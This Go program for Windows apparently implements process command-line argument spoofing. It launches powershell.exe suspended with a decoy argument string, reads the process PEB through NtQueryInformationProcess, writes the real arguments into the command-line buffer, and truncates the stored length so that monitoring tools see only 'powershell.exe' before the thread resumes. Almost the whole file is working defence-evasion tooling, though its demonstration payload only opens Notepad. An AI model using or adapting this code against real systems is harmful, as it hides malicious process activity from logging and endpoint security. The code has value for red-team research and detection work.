package main

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	processBasicInformationClass = 0
	sizeExposedFromPayload       = (len("powershell.exe") + 1) * 2
	startupArguments             = "powershell.exe This is a dummie argument for test"
	realExecutedArguments        = "powershell.exe -NoExit notepad.exe"
)

type peb struct {
	Reserved1              [2]byte
	BeingDebugged          byte
	Reserved2              [1]byte
	Reserved3              [2]uintptr
	Ldr                    uintptr
	ProcessParameters      uintptr
	Reserved4              [104]byte
	Reserved5              [52]uintptr
	PostProcessInitRoutine uintptr
	Reserved6              [128]byte
	Reserved7              [1]uintptr
	SessionId              uint32
}

type rtlUserProcessParameters struct {
	Reserved1     [16]byte
	Reserved2     [10]uintptr
	ImagePathName unicodeString
	CommandLine   unicodeString
}

type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uintptr // PWSTR
}

type processBasicInformation struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr // PPEB
	Reserved2       [2]uintptr
	UniqueProcessId uintptr
	Reserved3       uintptr
}

func main() {
	fmt.Printf("[i] Target process will be created with [Startup Arguments]: \"%s\"\n", startupArguments)
	fmt.Printf("[i] The actual arguments [Payload Argument]: \"%s\"\n", realExecutedArguments)

	processId, processHandle, threadHandle, err := createArgSpoofedProcess(startupArguments, realExecutedArguments)
	if err != nil {
		log.Fatalf("Failed to create spoofed process: %v", err)
		windows.CloseHandle(processHandle)
		windows.CloseHandle(threadHandle)
		return
	}

	fmt.Printf("\n[+] Spoofed process created successfully. PID: %d\n", processId)
}

func readFromTargetProcess(processHandle windows.Handle, address uintptr, size uint32) ([]byte, error) {
	buffer := make([]byte, size)
	var numberOfBytesRead uintptr

	err := windows.ReadProcessMemory(processHandle, address, &buffer[0], uintptr(size), &numberOfBytesRead)
	if err != nil {
		return nil, fmt.Errorf("ReadProcessMemory failed: %w (bytes read: %d of %d)", err, numberOfBytesRead, size)
	}
	if numberOfBytesRead != uintptr(size) {
		return nil, fmt.Errorf("ReadProcessMemory read unexpected number of bytes: %d of %d", numberOfBytesRead, size)
	}
	return buffer, nil
}

func writeToTargetProcess(processHandle windows.Handle, address uintptr, buffer []byte) error {
	var numberOfBytesWritten uintptr
	size := uintptr(len(buffer))

	err := windows.WriteProcessMemory(processHandle, address, &buffer[0], size, &numberOfBytesWritten)
	if err != nil {
		return fmt.Errorf("WriteProcessMemory failed: %w (bytes written: %d of %d)", err, numberOfBytesWritten, size)
	}
	if numberOfBytesWritten != size {
		return fmt.Errorf("WriteProcessMemory wrote unexpected number of bytes: %d of %d", numberOfBytesWritten, size)
	}
	return nil
}

func createArgSpoofedProcess(startupArgs, realArgs string) (processId uint32, processHandle windows.Handle, threadHandle windows.Handle, err error) {

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	ntdll := windows.NewLazyDLL("ntdll.dll")
	ntQueryInformationProcessProc := ntdll.NewProc("NtQueryInformationProcess")
	startupArgsUTF16, err := windows.UTF16PtrFromString(startupArgs)
	if err != nil {
		return 0, 0, 0, fmt.Errorf("failed to convert startupArgs to UTF16: %w", err)
	}

	cwd, err := windows.UTF16PtrFromString("C:\\Windows\\System32\\")
	if err != nil {
		cwd = nil
		log.Printf("Warning: could not convert working directory, using default: %v", err)
	}

	fmt.Printf("\t[i] Running: \"%s\" ... ", startupArgs)

	creationFlags := uint32(windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW)
	err = windows.CreateProcess(
		nil,
		startupArgsUTF16,
		nil,
		nil,
		false,
		creationFlags,
		nil,
		cwd,
		&si,
		&pi)

	if err != nil {
		fmt.Println("[!] FAILED")
		return 0, 0, 0, fmt.Errorf("CreateProcessW failed: %w", err)
	}
	fmt.Println("[+] DONE")

	fmt.Printf("\t[i] Target process created with PID: %d\n", pi.ProcessId)

	defer func() {
		if processHandle != 0 {
			windows.CloseHandle(processHandle)
		}
		if threadHandle != 0 {
			windows.CloseHandle(threadHandle)
		}
	}()

	processHandle = pi.Process
	threadHandle = pi.Thread

	var pbi processBasicInformation
	var returnLength uint32

	ntStatus, _, ntErr := ntQueryInformationProcessProc.Call(
		uintptr(processHandle),
		uintptr(processBasicInformationClass),
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ntStatus != 0 {
		return pi.ProcessId, processHandle, threadHandle, fmt.Errorf("NtQueryInformationProcess failed with status: 0x%X, error: %v", ntStatus, ntErr)
	}

	pebData, err := readFromTargetProcess(processHandle, pbi.PebBaseAddress, uint32(unsafe.Sizeof(peb{})))
	if err != nil {
		return pi.ProcessId, processHandle, threadHandle, fmt.Errorf("failed to read target process PEB: %w", err)
	}
	pebPtr := (*peb)(unsafe.Pointer(&pebData[0]))

	paramsReadSize := uint32(unsafe.Sizeof(rtlUserProcessParameters{}) + 255)
	paramsData, err := readFromTargetProcess(processHandle, pebPtr.ProcessParameters, paramsReadSize)
	if err != nil {
		return pi.ProcessId, processHandle, threadHandle, fmt.Errorf("failed to read target process parameters: %w", err)
	}
	paramsPtr := (*rtlUserProcessParameters)(unsafe.Pointer(&paramsData[0]))

	realArgsUTF16 := windows.StringToUTF16(realArgs)
	realArgsBytes := unsafe.Slice((*byte)(unsafe.Pointer(&realArgsUTF16[0])), len(realArgsUTF16)*2)

	fmt.Printf("\t[i] Writing \"%s\" as the process argument at: 0x%X ... ", realArgs, paramsPtr.CommandLine.Buffer)
	err = writeToTargetProcess(processHandle, paramsPtr.CommandLine.Buffer, realArgsBytes)
	if err != nil {
		fmt.Println("[!] FAILED")
		return pi.ProcessId, processHandle, threadHandle, fmt.Errorf("failed to write the real parameters: %w", err)
	}
	fmt.Println("[+] DONE")

	newLength := uint16((sizeExposedFromPayload/2)-1) * 2

	lengthBytes := (*[unsafe.Sizeof(newLength)]byte)(unsafe.Pointer(&newLength))[:]

	commandLineOffset := unsafe.Offsetof(paramsPtr.CommandLine)
	lengthFieldOffset := unsafe.Offsetof(paramsPtr.CommandLine.Length)
	lengthFieldAddress := pebPtr.ProcessParameters + commandLineOffset + lengthFieldOffset

	fmt.Printf("\n\t[i] Updating the length of the process argument from %d to %d ... ", paramsPtr.CommandLine.Length, newLength)
	err = writeToTargetProcess(processHandle, lengthFieldAddress, lengthBytes)
	if err != nil {
		fmt.Println("[!] FAILED")
		return pi.ProcessId, processHandle, threadHandle, fmt.Errorf("failed to write the new command line length: %w", err)
	}
	fmt.Println("[+] DONE")

	_, err = windows.ResumeThread(threadHandle)
	if err != nil {

		return pi.ProcessId, processHandle, threadHandle, fmt.Errorf("failed to resume thread: %w", err)
	}

	processId = pi.ProcessId
	retProcessHandle := processHandle
	retThreadHandle := threadHandle
	processHandle = 0
	threadHandle = 0

	return processId, retProcessHandle, retThreadHandle, nil
}
